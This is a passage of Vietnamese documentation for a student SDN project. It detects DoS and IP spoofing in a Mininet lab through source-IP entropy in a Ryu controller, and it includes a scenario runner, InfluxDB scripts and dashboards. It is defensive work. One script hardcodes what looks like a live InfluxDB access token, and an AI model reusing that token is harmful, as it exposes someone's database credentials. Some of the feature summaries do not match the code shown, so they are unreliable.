            hub.sleep(3)

            current_rate = self.packet_rate
            self.packet_rate = 0
            entropy = 0.0
            current_pps = self.total_pps
            window_size = len(self.src_ip_window)

            if window_size >= 100:
                ip_counts = Counter(self.src_ip_window)
                total = len(self.src_ip_window)

                for count in ip_counts.values():
                    p = count / total
                    entropy -= p * math.log2(p)

                self.logger.info("[ENTROPY] Gia tri entropy = %.2f | Tong goi = %d | So IP duy nhat = %d", entropy, total, len(ip_counts))

                if entropy < self.ENTROPY_LOW:
                    self.attack_status = 1
                    self.logger.warning("[CANH BAO] Phat hien tan cong DoS bang IP co dinh! Entropy = %.2f (nguong < %.2f)", entropy, self.ENTROPY_LOW)
                    for ip, count in ip_counts.items():
                        if (count / total) > 0.20 and ip not in self.blocked_ips:
                            if ip in self.WHITELIST_SRC:
                                continue
                            self.logger.warning("[BLOCK] Chan IP %s — da gui %d goi (chiem %.1f%% tong traffic)", ip, count, (count/total)*100)
                            self._block_ip(ip)
                    self.src_ip_window.clear()
                    self.src_mac_window.clear()

                elif entropy > self.ENTROPY_HIGH:
                    self.attack_status = 2
                    self.logger.warning("[CANH BAO] Phat hien tan cong DoS bang IP gia mao! Entropy = %.2f (nguong > %.2f)", entropy, self.ENTROPY_HIGH)
                    # Tim MAC gui nhieu nhat — chinh la MAC thuc cua ke tan cong
                    mac_counts = Counter(self.src_mac_window)
                    for mac, count in mac_counts.most_common():
                        if mac not in self.blocked_macs:
                            self.logger.warning("[BLOCK] Chan MAC %s — da gui %d goi spoof (chiem %.1f%% tong traffic)", mac, count, (count/total)*100)
                            self._block_mac(mac)
                    self.src_ip_window.clear()
                    self.src_mac_window.clear()
                else:
                    self.attack_status = 0
            else:
                pass

           # --- GUI DU LIEU LEN INFLUXDB ---
            if self.influx_client:
                try:
                    self.influx_client.write_points([{
                        "measurement": "network_traffic",
                        "fields": {
                            "packet_rate": int(current_rate),
                            "total_pps": int(current_pps),
                            "entropy": round(float(entropy), 4),
                            "attack_status": int(self.attack_status),
                            "blocked_ip_count": int(len(self.blocked_ips)),
                            "blocked_mac_count": int(len(self.blocked_macs)),
                            "window_fill": int(window_size)
                        }
                    }])
                except Exception as e:
                    self.logger.error("[INFLUXDB] Khong the ghi du lieu vao InfluxDB: %s", e)

    def _block_ip(self, bad_ip):
        self.blocked_ips.add(bad_ip)
        for dp in self.dps.values():
            parser = dp.ofproto_parser
            match = parser.OFPMatch(eth_type=0x0800, ipv4_src=bad_ip)
            inst = [parser.OFPInstructionActions(dp.ofproto.OFPIT_APPLY_ACTIONS, [])]
            dp.send_msg(parser.OFPFlowMod(
                datapath=dp, priority=100, match=match,
                instructions=inst, hard_timeout=60))

        def unblock():
            hub.sleep(61)
            self.blocked_ips.discard(bad_ip)
            self.logger.info("[UNBLOCK] Da go chan IP %s sau 60 giay", bad_ip)
        hub.spawn(unblock)

    def _block_mac(self, bad_mac):
        self.blocked_macs.add(bad_mac)
        for dp in self.dps.values():
            parser = dp.ofproto_parser
            match = parser.OFPMatch(eth_src=bad_mac)
            inst = [parser.OFPInstructionActions(dp.ofproto.OFPIT_APPLY_ACTIONS, [])]
            dp.send_msg(parser.OFPFlowMod(
                datapath=dp, priority=100, match=match,
                instructions=inst, hard_timeout=60))

        def unblock():
            hub.sleep(61)
            self.blocked_macs.discard(bad_mac)
            self.logger.info("[UNBLOCK] Da go chan MAC %s sau 60 giay", bad_mac)
        hub.spawn(unblock)

   #  THEO DOI FLOW DE TINH TOC DO GOI
    def _monitor_flows(self):
        while True:
            for dp in self.dps.values():
                dp.send_msg(dp.ofproto_parser.OFPFlowStatsRequest(dp))
            hub.sleep(3)

    @set_ev_cls(ofp_event.EventOFPFlowStatsReply, MAIN_DISPATCHER)
    def flow_stats_reply_handler(self, ev):
        now = time.time()
        sum_pps = 0
        for stat in ev.msg.body:
            if stat.priority == 0:
                continue
            src = stat.match.get('ipv4_src')
            if not src or src in self.gateways or src in self.WHITELIST_SRC:
                continue
            key = (ev.msg.datapath.id, src, stat.match.get('ipv4_dst'))
            prev = self.flow_stats.get(key)
            if prev:
                delta = now - prev[1]
                if delta > 0:
                    pps = (stat.packet_count - prev[0]) / delta
                    if pps > 0:
                        sum_pps += pps
                    if pps > 500 and src not in self.blocked_ips:
                        self.logger.warning("[BLOCK] Chan IP %s — toc do qua cao: %d goi/giay (nguong: 500)", src, int(pps))
                        self._block_ip(src)
            self.flow_stats[key] = (stat.packet_count, now)
        self.total_pps = int(sum_pps)

     # XU LY PACKET IN TU SWITCH
    
    @set_ev_cls(ofp_event.EventOFPPacketIn, MAIN_DISPATCHER)
    def _packet_in_handler(self, ev):
        msg = ev.msg
        dp = msg.datapath
        in_port = msg.match['in_port']

        pkt = packet.Packet(msg.data)
        p_eth = pkt.get_protocol(ethernet.ethernet)
        if p_eth.ethertype == 0x88CC:
            return

        if dp.id != 2:
            return super(SimpleRouterEntropy, self)._packet_in_handler(ev)

        p_arp = pkt.get_protocol(arp.arp)
        p_ip = pkt.get_protocol(ipv4.ipv4)

        if p_arp:
            self.arp_table[p_arp.src_ip] = p_arp.src_mac
            if p_arp.opcode == arp.ARP_REQUEST and p_arp.dst_ip in self.gateways:
                self._send_arp(dp, in_port, p_eth.src, arp.ARP_REPLY,
                               self.mac, p_arp.dst_ip, p_arp.src_mac, p_arp.src_ip)
            return

        if p_ip:
            self.packet_rate += 1

            if p_ip.src not in self.gateways and p_ip.src not in self.WHITELIST_SRC:
                self.src_ip_window.append(p_ip.src)
                self.src_mac_window.append(p_eth.src)
                if len(self.src_ip_window) > self.WINDOW_SIZE:
                    self.src_ip_window.pop(0)
                    self.src_mac_window.pop(0)

            out_port = None
            for net, port in self.routes.items():
                if p_ip.dst.startswith(net):
                    out_port = port
                    break
            if not out_port:
                return

            if p_ip.dst not in self.arp_table:
                self._send_arp(dp, out_port, 'ff:ff:ff:ff:ff:ff', arp.ARP_REQUEST,
                               self.mac, '0.0.0.0', '00:00:00:00:00:00', p_ip.dst)
                return

            parser = dp.ofproto_parser
            actions = [
                parser.OFPActionSetField(eth_src=self.mac),
                parser.OFPActionSetField(eth_dst=self.arp_table[p_ip.dst]),
                parser.OFPActionOutput(out_port)
            ]

            # Chi cai flow cho whitelist IP, non-whitelist luon di qua controller
            if p_ip.src in self.WHITELIST_SRC:
                match = parser.OFPMatch(eth_type=0x0800, ipv4_src=p_ip.src, ipv4_dst=p_ip.dst)
                self.add_flow(dp, 10, match, actions, idle_timeout=30)

            dp.send_msg(parser.OFPPacketOut(
                datapath=dp, buffer_id=msg.buffer_id,
                in_port=in_port, actions=actions, data=msg.data))

    def add_flow(self, datapath, priority, match, actions, idle_timeout=0, **kwargs):
        parser = datapath.ofproto_parser
        inst = [parser.OFPInstructionActions(datapath.ofproto.OFPIT_APPLY_ACTIONS, actions)]
        datapath.send_msg(parser.OFPFlowMod(
            datapath=datapath, priority=priority, match=match,
            instructions=inst, idle_timeout=idle_timeout))

    def _send_arp(self, dp, port, eth_dst, opcode, s_mac, s_ip, d_mac, d_ip):
        pkt = packet.Packet()
        pkt.add_protocol(ethernet.ethernet(ethertype=0x0806, dst=eth_dst, src=self.mac))
        pkt.add_protocol(arp.arp(opcode=opcode, src_mac=s_mac, src_ip=s_ip, dst_mac=d_mac, dst_ip=d_ip))
        pkt.serialize()
        dp.send_msg(dp.ofproto_parser.OFPPacketOut(
            datapath=dp, buffer_id=dp.ofproto.OFP_NO_BUFFER,
            in_port=dp.ofproto.OFPP_CONTROLLER,
            actions=[dp.ofproto_parser.OFPActionOutput(port)], data=pkt.data))
```

**Chức năng:**

- SimpleRouterEntropy class
- Entropy-based intrusion detection
- MAC address table learning
- Traffic monitoring + flow stats collection
- ARP handling
- IP spoofing detection (High entropy)
- DoS attack detection (Low entropy)
- InfluxDB integration (HAS_INFLUX = False)

---

#### **`run_scenario.py`** (135 dòng)

```python
import subprocess
import time
import json
import sys
import os
import requests

RYU_REST = "http://localhost:8081/stats/flow/2"
ALERT_LOG = "results/raw/alerts.json"
DETECTOR_LOG = "results/raw/detector.log"
RYU_LOG = "results/raw/ryu.log"

def start_topology():
    print("[*] Dang don dep Mininet...")
    subprocess.run(["sudo", "mn", "-c"], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    print("[*] Dang khoi dong Topology V4...")
    p = subprocess.Popen(["sudo", "python3", "code/topology/topology_v4.py"],
                         stdin=subprocess.PIPE, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(8)
    return p

def start_ryu():
    print(f"[*] Dang khoi dong Ryu (log: {RYU_LOG})...")
    ryu_out = open(RYU_LOG, 'w')
    p = subprocess.Popen(["ryu-manager", "--wsapi-port", "8081", "ryu.app.ofctl_rest", "code/l3_router_extended.py"],
                         stdout=ryu_out, stderr=subprocess.STDOUT)
    time.sleep(3)
    return p, ryu_out

def start_detector():
    print(f"[*] Dang khoi dong Detector (log: {DETECTOR_LOG})...")
    det_out = open(DETECTOR_LOG, 'w')
    p = subprocess.Popen(["python3", "-u", "code/detector.py"], stdout=det_out, stderr=subprocess.STDOUT)
    return p, det_out

def wait_for_alert(t0, timeout=15):
    while time.time() - t0 < timeout:
        if os.path.exists(ALERT_LOG):
            try:
                with open(ALERT_LOG, 'r') as f:
                    for line in f:
                        if not line.strip(): continue
                        ev = json.loads(line)
                        if ev.get("timestamp", 0) >= t0:
                            return ev["timestamp"] - t0
            except Exception: 
                pass
        time.sleep(0.2)
    return None

def wait_for_flowmod(t0, src_ip, timeout=20):
    while time.time() - t0 < timeout:
        try:
            r = requests.get(RYU_REST, timeout=1).json()
            if src_ip in str(r): 
                return time.time() - t0
        except Exception: 
            pass
        time.sleep(0.3)
    return None

def run(scenario_id):
    os.makedirs("results/raw", exist_ok=True)
    
    # Reset log alert
    open(ALERT_LOG, 'w').close()

    print(f"\n========== BAT DAU KICH BAN: {scenario_id} ==========")
    mn = start_topology()
    ryu, ryu_out = start_ryu()
    det, det_out = start_detector()
    
    try:
        t0 = time.time()
        
        # --- DOAN CODE MOI DUOC THEM VAO ---
        print("[*] Chay pingall de hoc ARP...")
        mn.stdin.write(b"pingall\n")
        mn.stdin.flush()
        time.sleep(5)
        # ----------------------------------

        print(f"[*] Tien hanh kich hoat ma doc tan cong (h_att1)...")
        mn.stdin.write(f"h_att1 bash code/attack_scripts/{scenario_id}.sh &\n".encode())
        mn.stdin.flush()
        
        src = "10.0.4.10" if scenario_id == "s08_flashcrowd" else "10.0.1.10"
        
        print("[*] Dang cho he thong phat hien (Detect)...")
        detect_lat = wait_for_alert(t0, timeout=15)
        if detect_lat:
            print(f"  [+] Da phat hien tan cong! Do tre: {detect_lat:.3f}s")
        else:
            print("  [-] Khong phat hien duoc canh bao. Kiem tra log cua detector hoac ryu.")

        print("[*] Dang cho he thong ngan chan (Mitigate)...")
        mitigate_lat = wait_for_flowmod(t0, src, timeout=20)
        if mitigate_lat:
            print(f"  [+] Da cai Flow Drop! Do tre: {mitigate_lat:.3f}s")
        else:
            print(f"  [-] Khong tim thay Flow Drop nao cho {src}.")

        result = {
            "scenario": scenario_id, 
            "timestamp": t0,
            "detect_latency": detect_lat, 
            "mitigate_latency": mitigate_lat,
            "attack_window":[t0, t0 + 300],
            "expected_alert": scenario_id != "s08_flashcrowd"
        }
        
        out_file = f"results/raw/run_{scenario_id}_{int(t0)}.json"
        with open(out_file, 'w') as f:
            json.dump(result, f, indent=2)
        print(f"[+] Hoan tat! Da luu ket qua tai: {out_file}\n")
        
        return result
    finally:
        print("[*] Dang don dep va tat cac tien trinh...")
        det.terminate()
        ryu.terminate()
        det_out.close()
        ryu_out.close()
        try: 
            mn.communicate(b"exit\n", timeout=10)
        except: 
            mn.kill()
        subprocess.run(["sudo", "mn", "-c"], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

if __name__ == "__main__": 
    if len(sys.argv) > 1:
        run(sys.argv[1])
    else:
        print("Loi: Vui long truyen kich ban. VD: sudo python3 code/run_scenario.py s01_syn")
```

**Chức năng:**

- End-to-end scenario test runner
- Start topology (Mininet)
- Start Ryu controller
- Start Detector process
- Run attack script
- Wait for detection (15s timeout)
- Wait for mitigation (20s timeout)
- Log results to JSON
- Cleanup

---

#### **`policy.yaml`** (13 dòng)

```yaml
graduated_response:
  - level: 1
    action: log
    threshold: 1
  - level: 2
    action: rate_limit
    pps: 1000
    threshold: 2
    duration: 120
  - level: 3
    action: block
    threshold: 3
    duration: 60
```

**Nội dung:**

- Level 1: Log (trigger ngay)
- Level 2: Rate limit 1000 pps, duration 120s (khi 2 detector trigger)
- Level 3: Block (hard drop), duration 60s (khi 3 detector trigger)

---

#### **`whitelist.txt`** (6 dòng)

```
# Trusted IPs — KHONG bao gio block
10.0.1.1
10.0.2.1
10.0.3.1
10.0.4.1
10.0.2.11
```

**Danh sách IP tin cậy:** Gateway + Management host

---

### 🔸 `code/pipeline/` - Data Pipeline

#### **`influx_writer.py`** (50+ dòng)

```python
#!/usr/bin/env python3
"""
Pipeline doc InfluxDB router cu
Trich xuat du lieu entropy realtime de TV1 va TV3 su dung.
"""

import csv
import os
import sys

try:
    from influxdb_client import InfluxDBClient
except ImportError:
    print("[ERROR] Thieu thu vien influxdb-client. Chay: pip3 install influxdb-client")
    sys.exit(1)

# Thiet lap ket noi InfluxDB
URL = "http://localhost:8086"
# Luu y: Ban can hoi TV4 de lay Token chinh xac thay vao chu admin-token nay
TOKEN = "admin-token" 
ORG = "sdn"
BUCKET = "sdn"
OUT_CSV = "datasets/features/realtime.csv"

def pull_data():
    print(f"[*] Dang ket noi den InfluxDB tai {URL}...")
    client = InfluxDBClient(url=URL, token=TOKEN, org=ORG)
    
    query = f'''
        from(bucket:"{BUCKET}") 
        |> range(start: -30m)
        |> filter(fn: (r) => r._measurement == "entropy")
    '''
    
    try:
        tables = client.query_api().query(query)
    except Exception as e:
        print(f"[ERROR] Khong the truy van InfluxDB. DB da chay chua? Chi tiet loi: {e}")
        sys.exit(1)

    os.makedirs(os.path.dirname(OUT_CSV), exist_ok=True)

    row_count = 0
    with open(OUT_CSV, 'w', newline='') as f:
        w = csv.writer(f)
        w.writerow(['t', 'metric', 'value'])
        
        for tbl in tables:
            for rec in tbl.records:
                w.writerow([rec.get_time(), rec.get_field(), rec.get_value()])
                row_count += 1

    print(f"[+] Da pull thanh cong {row_count} records tu InfluxDB.")
    print(f"[+] Output luu tai: {OUT_CSV}")

if __name__ == '__main__':
    pull_data()
```

**Chức năng:**

- Kết nối InfluxDB (Token-based auth)
- Query entropy data từ bucket (30 phút gần nhất)
- Export CSV realtime
- Error handling khi DB không chạy
- CLI: python3 pipeline/influx_writer.py

### 🔸 `code/scripts/` - Utility Scripts

#### **`compute_baseline.py`** (140+ dòng)

```python
import math
import json
import sys
import os
import statistics
from collections import Counter
 
# Kiểm tra scapy
try:
    from scapy.all import PcapReader, IP, TCP, UDP
    HAS_SCAPY = True
except ImportError:
    print("[ERROR] Scapy chưa cài. Chạy: pip3 install scapy")
    sys.exit(1)
 
 
def shannon_entropy(items):
    """Tính Shannon entropy của danh sách items."""
    if not items:
        return 0.0
    c = Counter(items)
    total = sum(c.values())
    entropy = 0.0
    for count in c.values():
        p = count / total
        if p > 0:
            entropy -= p * math.log2(p)
    return entropy
 
 
def compute_baseline(pcap_path, window_sec=1.0, output_path=None):
    """
    Đọc pcap, chia window 1s, tính pps/bps/entropy_src/entropy_dport.
    Trả về dict stats với mean và std.
    """
    print(f"[INFO] Đang đọc: {pcap_path}")
 
    if not os.path.exists(pcap_path):
        print(f"[ERROR] File không tồn tại: {pcap_path}")
        sys.exit(1)
 
    # Thu thập tất cả packet với timestamp
    packets = []
    total_read = 0
    with PcapReader(pcap_path) as reader:
        for pkt in reader:
            total_read += 1
            if total_read % 10000 == 0:
                print(f"  Đã đọc {total_read} gói...")
            if pkt.haslayer(IP):
                ts = float(pkt.time)
                size = len(pkt)
                src_ip = pkt[IP].src
                dport = None
                if pkt.haslayer(TCP):
                    dport = pkt[TCP].dport
                elif pkt.haslayer(UDP):
                    dport = pkt[UDP].dport
                packets.append((ts, size, src_ip, dport))
 
    if len(packets) < 10:
        print(f"[ERROR] Quá ít packet IP ({len(packets)}). Kiểm tra lại pcap.")
        sys.exit(1)
 
    print(f"[INFO] Tổng gói IP: {len(packets)}")
 
    # Tính features theo window 1s
    t_start = packets[0][0]
    t_end   = packets[-1][0]
    total_duration = t_end - t_start
    print(f"[INFO] Thời gian capture: {total_duration:.1f}s ({total_duration/60:.1f} phút)")
 
    pps_list      = []
    bps_list      = []
    entropy_src_list   = []
    entropy_dport_list = []
 
    t = t_start
    while t < t_end:
        window = [(ts, sz, src, dp) for (ts, sz, src, dp) in packets if t <= ts < t + window_sec]
        if not window:
            t += window_sec
            continue
 
        n        = len(window)
        byte_sum = sum(sz for (_, sz, _, _) in window)
        srcs     = [src for (_, _, src, _) in window]
        dports   = [dp for (_, _, _, dp) in window if dp is not None]
 
        pps_list.append(n / window_sec)
        bps_list.append(byte_sum * 8 / window_sec)
        entropy_src_list.append(shannon_entropy(srcs))
        entropy_dport_list.append(shannon_entropy(dports) if dports else 0.0)
 
        t += window_sec
 
    if len(pps_list) < 2:
        print("[ERROR] Không đủ window để tính stats. Cần pcap dài hơn.")
        sys.exit(1)
 
    print(f"[INFO] Số window (1s): {len(pps_list)}")
 
    # Tính mean và std
    def stats(lst):
        return {
            "mean": round(statistics.mean(lst), 4),
            "std":  round(statistics.stdev(lst), 4)
        }
 
    baseline = {
        "pps":           stats(pps_list),
        "bps":           stats(bps_list),
        "entropy_src":   stats(entropy_src_list),
        "entropy_dport": stats(entropy_dport_list)
    }
 
    # In kết quả
    print("\n[BASELINE STATS]")
    for k, v in baseline.items():
        print(f"  {k:20s}: mean={v['mean']:.4f}, std={v['std']:.4f}")
 
    # Lưu file
    if output_path is None:
        output_path = "tests/fixtures/baseline.json"
 
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    with open(output_path, 'w') as f:
        json.dump(baseline, f, indent=2)
 
    print(f"\n[OK] Đã lưu baseline → {output_path}")
    return baseline
 
 
def generate_mock_baseline(output_path="tests/fixtures/baseline.json"):
    """
    Tạo baseline.json giả (dùng khi chưa có pcap thật)
    """
    mock = {
        "pps":           {"mean": 50.0,  "std": 10.0},
        "bps":           {"mean": 400000.0, "std": 80000.0},
        "entropy_src":   {"mean": 3.5,   "std": 0.5},
        "entropy_dport": {"mean": 4.0,   "std": 0.8}
    }
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    with open(output_path, 'w') as f:
        json.dump(mock, f, indent=2)
    print(f"[OK] Đã tạo mock baseline → {output_path}")
    return mock
 
 
if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python3 compute_baseline.py <pcap_path> [output_json]")
        print("       python3 compute_baseline.py --mock")
        sys.exit(1)
 
    if sys.argv[1] == '--mock':
        generate_mock_baseline()
    else:
        pcap = sys.argv[1]
        out  = sys.argv[2] if len(sys.argv) > 2 else None
        compute_baseline(pcap, output_path=out)
```

**Chức năng:**

- Tính baseline statistics từ PCAP bình thường
- Sliding window extraction
- Tính mean/std cho PPS, entropy_src, entropy_dport
- Generate mock baseline nếu không có PCAP
- Lưu JSON output
- CLI args: --output, --mock

---

#### **`influx_pull.py`** (30+ dòng)

```python
from influxdb_client import InfluxDBClient
import csv
import os

# --- CẤU HÌNH INFLUXDB ---
INFLUX_TOKEN = "2Bdyw5xOnRrLQK-s7NFS0IxylcXDSt86UhpqFr-H4moUw4nxR-QxmsD5LkNQHMcC66hk7A9X-NUvk7iNk4MNvQ==" 
INFLUX_URL = "http://localhost:8086"
ORG = "sdn"
BUCKET = "sdn"

# 1. Đảm bảo thư mục tồn tại
os.makedirs('datasets/features', exist_ok=True)

# 2. Kết nối InfluxDB bằng chìa khóa
client = InfluxDBClient(url=INFLUX_URL, token=INFLUX_TOKEN, org=ORG)
q = f'''from(bucket:"{BUCKET}") |> range(start:-30m)
       |> filter(fn:(r)=> r._measurement=="entropy")'''

# 3. Kéo dữ liệu và lưu CSV
try:
    tables = client.query_api().query(q)
    with open('datasets/features/realtime.csv', 'w', newline='') as f:
        w = csv.writer(f)
        w.writerow(['t','metric','value'])
        
        for tbl in tables:
            for rec in tbl.records:
                w.writerow([rec.get_time(), rec.get_field(), rec.get_value()])
                
    print("[OK] Pipeline da chay thanh cong va tao file realtime.csv!")
except Exception as e:
    print(f"[LOI] Co van de xay ra: {e}")
```

**Chức năng:**

- Kết nối InfluxDB dùng token
- Query entropy metrics từ N phút gần nhất
- Export CSV với timestamp, entropy, packet_rate, attack_status
- CLI args: [output_file] [minutes]

---

### 🔸 `code/templates/` - HTML Templates

#### **`index.html`** (50+ dòng)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SDN DDoS Detection Dashboard</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chartjs-adapter-date-fns"></script>
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; }
        .chart-container { width: 80%; margin: auto; }
    </style>
</head>
<body>
    <h2 style="text-align: center;">Real-time Entropy Dashboard</h2>
    
    <div class="chart-container">
        <canvas id="entropyChart"></canvas>
    </div>

    <script>
        /* Khoi tao bieu do Chart.js */
        const ctx = document.getElementById('entropyChart').getContext('2d');
        const entropyChart = new Chart(ctx, {
            type: 'line',
            data: {
                datasets: [{
                    label: 'Shannon Entropy (src_ip)',
                    data: [],
                    borderColor: 'rgba(255, 99, 132, 1)',
                    backgroundColor: 'rgba(255, 99, 132, 0.2)',
                    borderWidth: 2,
                    fill: true,
                    tension: 0.1
                }]
            },
            options: {
                scales: {
                    x: {
                        type: 'time',
                        time: { unit: 'second' },
                        title: { display: true, text: 'Thoi gian' }
                    },
                    y: {
                        title: { display: true, text: 'Gia tri Entropy' },
                        suggestedMin: 0,
                        suggestedMax: 5
                    }
                },
                animation: false /* Tat animation de bieu do cap nhat realtime muot ma hon */
            }
        });

        /* Fetch du lieu moi moi 2 giay (Tich hop A.3) */
        setInterval(async () => {
            try {
                const response = await fetch('/api/stats');
                const data = await response.json();
                
                /* Cap nhat mang data moi cho bieu do */
                entropyChart.data.datasets[0].data = data.entropy;
                entropyChart.update();
            } catch (error) {
                console.error("Loi khi lay du lieu: ", error);
            }
        }, 2000);
    </script>
</body>
</html>
```

**Chức năng:**

- Chart.js real-time dashboard
- Fetch `/api/stats` mỗi 2 giây
- Vẽ Shannon entropy (src_ip) line chart
- Responsive design
- Links to /alerts and /flows pages

#### **`alerts.html`**

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Alerts Dashboard</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; }
        table { border-collapse: collapse; width: 100%; margin-top: 20px; }
        th, td { border: 1px solid #ddd; padding: 10px; text-align: left; }
        th { background-color: #f4f4f4; }
        .CRITICAL { color: red; font-weight: bold; }
        .WARN { color: orange; font-weight: bold; }
        .block-box { margin-top: 20px; padding: 15px; border: 2px solid #dc3545; border-radius: 5px; background: #fff8f8; display: inline-block; }
        .block-box input { padding: 5px; }
        .block-box button { background: #dc3545; color: white; border: none; padding: 6px 15px; cursor: pointer; border-radius: 3px; }
        .block-box button:hover { background: #c82333; }
    </style>
</head>
<body>
    <h2>Danh sách Cảnh báo (Alerts)</h2>
    <a href="/">← Quay lại Biểu đồ (Home)</a> | <a href="/flows">Xem Flows →</a>
    
    <!-- PHẦN E: FORM MANUAL BLOCK -->
    <div class="block-box">
        <h3>🚨 Chặn IP thủ công (Manual Block)</h3>
        <input type="text" id="blockIpInput" placeholder="Nhập IP (VD: 10.0.1.10)">
        <button onclick="manualBlock()">Chặn ngay lập tức</button>
        <p id="blockResult" style="color: #dc3545; font-weight: bold; margin-bottom: 0;"></p>
    </div>

    <table>
        <tr>
            <th>Time</th>
            <th>Source IP</th>
            <th>Attack Type</th>
            <th>Severity</th>
            <th>Action</th>
        </tr>
        {% for alert in alerts %}
        <tr>
            <td>{{ alert.time }}</td>
            <td>{{ alert.src_ip }}</td>
            <td>{{ alert.attack }}</td>
            <td class="{{ alert.severity }}">{{ alert.severity }}</td>
            <td>{{ alert.action }}</td>
        </tr>
        {% else %}
        <tr>
            <td colspan="5" style="text-align: center;">Chưa có cảnh báo nào.</td>
        </tr>
        {% endfor %}
    </table>

    <script>
        function manualBlock() {
            const ip = document.getElementById('blockIpInput').value;
            if(!ip) return alert("Vui lòng nhập IP!");
            
            fetch('/api/block', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({src_ip: ip})
            }).then(res => res.json()).then(data => {
                if(data.ok) {
                    document.getElementById('blockResult').innerText = "✅ Đã ép Controller chặn IP: " + ip;
                } else {
                    alert("Lỗi: " + data.error);
                }
            }).catch(err => alert("Lỗi kết nối Backend!"));
        }
    </script>
</body>
</html>
```

**Chức năng:**

- Hiển thị danh sách alerts từ results/raw/alerts.json
- Cột: timestamp, src_ip, attack_type, severity, action
- Manual block IP form với fetch API
- POST /api/block endpoint

#### **`flows.html`**

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Flows Dashboard</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; }
        table { border-collapse: collapse; width: 100%; margin-top: 20px; }
        th, td { border: 1px solid #ddd; padding: 10px; text-align: left; }
        th { background-color: #e9ecef; }
        pre { margin: 0; white-space: pre-wrap; word-wrap: break-word; }
    </style>
</head>
<body>
    <h2>Danh sách OpenFlow Rules (Switch {{ dpid }})</h2>
    <a href="/">← Quay lại Biểu đồ (Home)</a> | <a href="/alerts">Xem Alerts →</a>
    
    <table>
        <tr>
            <th>Priority</th>
            <th>Match</th>
            <th>Actions</th>
            <th>Byte Count</th>
            <th>Packet Count</th>
        </tr>
        {% for flow in flows %}
        <tr>
            <td>{{ flow.priority }}</td>
            <td><pre>{{ flow.match | tojson }}</pre></td>
            <td><pre>{{ flow.actions | tojson }}</pre></td>
            <td>{{ flow.byte_count }}</td>
            <td>{{ flow.packet_count }}</td>
        </tr>
        {% else %}
        <tr>
            <td colspan="5" style="text-align: center;">Không lấy được luồng hoặc Switch trống.</td>
        </tr>
        {% endfor %}
    </table>
</body>
</html>
```

**Chức năng:**

- Hiển thị OpenFlow flow rules từ Ryu controller
- Cột: priority, match (JSON), actions (JSON), byte_count, packet_count
- GET /flows endpoint proxy qua Ryu REST API

---

### 🔸 `code/topology/` - Mininet Topology

#### **`topology_v4.py`** (250+ dòng)

```python
#!/usr/bin/env python3
"""
topology_v4.py — TV2 (Phúc) — Task 2.1 & 2.2
Topology V4: 12 hosts, 5 switches, OF1.3, QoS+Mirror ON.
Dùng để mô phỏng mạng và thu thập dữ liệu tấn công DoS.
"""

import os
import sys
import time
from mininet.net import Mininet
from mininet.node import RemoteController, OVSKernelSwitch
from mininet.link import TCLink
from mininet.cli import CLI
from mininet.log import setLogLevel, info

# --- CẤU HÌNH HỆ THỐNG ---
CTRL_IP = '127.0.0.1'
CTRL_PORT = 6653
OF_PROTO = 'OpenFlow13'
MIRROR_PORT = 99  # s2-eth99

# --- THÔNG SỐ ĐƯỜNG TRUYỀN ---
LINK_EXT  = dict(bw=10,  delay='2ms')   # Nhánh Attacker (Bóp băng thông)
LINK_SRV  = dict(bw=100, delay='1ms')   # Nhánh Server
LINK_PC   = dict(bw=50,  delay='1ms')   # Nhánh PC thường
LINK_HOST = dict(bw=100, delay='0.5ms') # Từ Host đến Switch

def build_topology():
    net = Mininet(controller=RemoteController, switch=OVSKernelSwitch,
                  link=TCLink, autoSetMacs=True, build=False)
                  
    info('*** Adding Controller\n')
    net.addController('c0', controller=RemoteController, ip=CTRL_IP, port=CTRL_PORT)

    info('*** Adding Switches\n')
    s1 = net.addSwitch('s1', dpid='0000000000000001', protocols=OF_PROTO) 
    s2 = net.addSwitch('s2', dpid='0000000000000002', protocols=OF_PROTO)  
    s3 = net.addSwitch('s3', dpid='0000000000000003', protocols=OF_PROTO)  
    s4 = net.addSwitch('s4', dpid='0000000000000004', protocols=OF_PROTO)  
    s5 = net.addSwitch('s5', dpid='0000000000000005', protocols=OF_PROTO)  

    info('*** Adding Hosts\n')
    # Nhánh External/Attacker (nối vào s1)
    h_att1 = net.addHost('h_att1', ip='10.0.1.10/24', defaultRoute='via 10.0.1.1')
    h_att2 = net.addHost('h_att2', ip='10.0.1.11/24', defaultRoute='via 10.0.1.1')
    h_att3 = net.addHost('h_att3', ip='10.0.1.12/24', defaultRoute='via 10.0.1.1')
    h_ext1 = net.addHost('h_ext1', ip='10.0.1.20/24', defaultRoute='via 10.0.1.1')

    # Nhánh Web/DNS Server (nối vào s3)
    h_web1 = net.addHost('h_web1', ip='10.0.2.10/24', defaultRoute='via 10.0.2.1')
    h_dns1 = net.addHost('h_dns1', ip='10.0.2.11/24', defaultRoute='via 10.0.2.1')

    # Nhánh App/DB Server (nối vào s4)
    h_db1  = net.addHost('h_db1',  ip='10.0.3.10/24', defaultRoute='via 10.0.3.1')
    h_app1 = net.addHost('h_app1', ip='10.0.3.11/24', defaultRoute='via 10.0.3.1')

    # Nhánh Client PC (nối vào s5)
    h_pc1 = net.addHost('h_pc1', ip='10.0.4.10/24', defaultRoute='via 10.0.4.1')
    h_pc2 = net.addHost('h_pc2', ip='10.0.4.11/24', defaultRoute='via 10.0.4.1')
    h_pc3 = net.addHost('h_pc3', ip='10.0.4.12/24', defaultRoute='via 10.0.4.1')
    h_pc4 = net.addHost('h_pc4', ip='10.0.4.13/24', defaultRoute='via 10.0.4.1')

    info('*** Creating Links\n')
    # Liên kết giữa các Switch
